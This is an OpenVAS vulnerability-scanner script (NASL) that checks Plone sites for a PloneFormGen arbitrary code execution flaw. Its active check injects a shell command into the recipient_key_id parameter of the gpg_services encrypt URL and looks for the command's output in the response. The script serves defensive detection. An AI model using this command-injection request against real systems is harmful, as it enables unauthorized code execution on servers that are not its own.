###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_plone_60247.nasl 11 2013-10-27 10:12:02Z jan $
#
# PloneFormGen Arbitrary Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "PloneFormGen is prone to an arbitrary code-execution vulnerability.

An attacker can leverage this issue to execute arbitrary code within
the context of the application.

PloneFormGen 1.7.4 through 1.7.8 are vulnerable; other versions may
also be affected.";


tag_solution = "Updates are available. Please see the references or vendor advisory
for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103736";
CPE = "cpe:/a:plone:plone";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(60247);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");

 script_name("PloneFormGen Arbitrary Code Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60247");
 script_xref(name:"URL", value:"http://plone.org/");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-06-12 11:35:33 +0200 (Wed, 12 Jun 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_plone_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("plone/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

cmds = exploit_commands();

foreach cmd (keys(cmds)) {

  url = dir + '/@@gpg_services/encrypt?data=&recipient_key_id=%26' + cmds[cmd];

  if(http_vuln_check(port:port, url:url, pattern:cmd)) {
     
    security_hole(port:port);
    exit(0);

  }

}

exit(99);

